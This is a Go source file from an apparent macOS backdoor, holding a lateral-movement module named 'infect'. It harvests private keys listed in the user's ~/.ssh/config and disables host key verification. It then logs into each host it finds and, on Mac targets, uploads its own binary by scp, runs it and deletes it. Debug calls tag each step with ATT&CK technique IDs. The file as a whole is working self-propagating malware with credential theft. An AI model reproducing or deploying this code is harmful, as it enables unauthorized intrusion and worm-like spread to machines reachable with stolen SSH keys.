package infect

import(
  "path/filepath"
  "os"
  "io"
  "sync"
  "fmt"
  "io/ioutil"
  "bytes"
  "strings"

  "../info"
  "../debug"
  gdoorConfig "../config"

  "github.com/kevinburke/ssh_config"
  "golang.org/x/crypto/ssh"
)

func parseConfig(i *info.Info)map[string]*ssh.ClientConfig{
  // check config existence
  path := filepath.Join(i.GetHomePath(), ".ssh", "config")
  _, err := os.Stat(path)
  if os.IsNotExist(err) {
    return map[string]*ssh.ClientConfig{}
  }

  debug.Log("T1081", "", "", "Credentials in Files")

  // move to .ssh
  curPath, err := os.Getwd()
  if err != nil {
    debug.Println(err)
    return map[string]*ssh.ClientConfig{}
  }

  err = os.Chdir(filepath.Join(i.GetHomePath(), ".ssh"))
  if err != nil {
    debug.Println(err)
    return map[string]*ssh.ClientConfig{}
  }

  // parse
  f, err := os.Open(path)
  if err != nil {
    debug.Println(err)
    return map[string]*ssh.ClientConfig{}
  }
  defer f.Close()

  cfg, err := ssh_config.Decode(f)
  if err != nil {
    debug.Println(err)
    return map[string]*ssh.ClientConfig{}
  }


  configs := make(map[string]*ssh.ClientConfig)
  for _, host := range cfg.Hosts {
    for _, pattern := range host.Patterns {
      hostname, _ := cfg.Get(pattern.String(), "hostname")
      user, _ := cfg.Get(pattern.String(), "user")
      port, _ := cfg.Get(pattern.String(), "port")
      identityfile, _ := cfg.Get(pattern.String(), "identityfile")

      if hostname != "" && user != "" && port != "" && identityfile != "" {
        debug.Log("T1145", "", "", "Private Keys")

	// get private key
        if !strings.Contains(identityfile, "~") {
          identityfile, _ = filepath.Abs(identityfile)
        } else if len(identityfile) > 0 && identityfile[0] == '~' {
          identityfile = filepath.Join(i.GetHomePath(), identityfile[1:])
        }
	key, err := ioutil.ReadFile(identityfile)
	if err != nil {
	  debug.Println(err)
	  continue
	}

	// Create the Signer for this private key.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
	  debug.Println(err)
	  continue
	}

	// build config
	configs[fmt.Sprintf("%s:%s", hostname, port)] = &ssh.ClientConfig{
	  User: user,
	  Auth: []ssh.AuthMethod{
	    ssh.PublicKeys(signer),
	  },
	  HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
      }
    }
  }

  // move back to original working directory
  err = os.Chdir(curPath)
  if err != nil {
    debug.Println(err)
    return map[string]*ssh.ClientConfig{}
  }

  return configs
}

func sendFileAndExecute(i *info.Info, configs map[string]*ssh.ClientConfig){
  for host, config := range configs {
    // connect
    client, err := ssh.Dial("tcp", host, config)
    if err != nil {
      debug.Println(err)
      continue
    }

    // new session for command
    csession, err := client.NewSession()
    if err != nil {
      debug.Println(err)
      continue
    }
    defer csession.Close()

    // check uname == Darwin 
    var b bytes.Buffer
    csession.Stdout = &b
    if err := csession.Run("/usr/bin/uname"); err != nil {
      debug.Println(err)
      continue
    }
    if(strings.TrimSpace(b.String()) != "Darwin"){
      debug.Println("Remote host isn't macos.")
      continue
    }

    // new session for file
    fsession, _ := client.NewSession()
    defer fsession.Close()

    file, _ := os.Open(i.GetCurPath())
    defer file.Close()
    stat, _ := file.Stat()

    wg := sync.WaitGroup{}
    wg.Add(1)

    go func() {
      hostIn, _ := fsession.StdinPipe()
      defer hostIn.Close()
      fmt.Fprintf(hostIn, "C0755 %d %s\n", stat.Size(), gdoorConfig.TargetName)
      io.Copy(hostIn, file)
      fmt.Fprint(hostIn, "\x00")
      wg.Done()
    }()

    fsession.Run("/usr/bin/scp -t ~")
    wg.Wait()

    debug.Log("T1105", "", "", "Remote File Copy")

    // new session for command
    csession, err = client.NewSession()
    if err != nil {
      debug.Println(err)
      continue
    }
    defer csession.Close()

    // execute and remove
    targetPath := filepath.Join("/Users", config.User, gdoorConfig.TargetName)
    if err := csession.Run(fmt.Sprintf("%s ; /bin/rm %s", targetPath, targetPath)); err != nil {
      debug.Println(err)
      continue
    }

    debug.Log("T1059", "", "", "Command-Line Interface")
  }
}
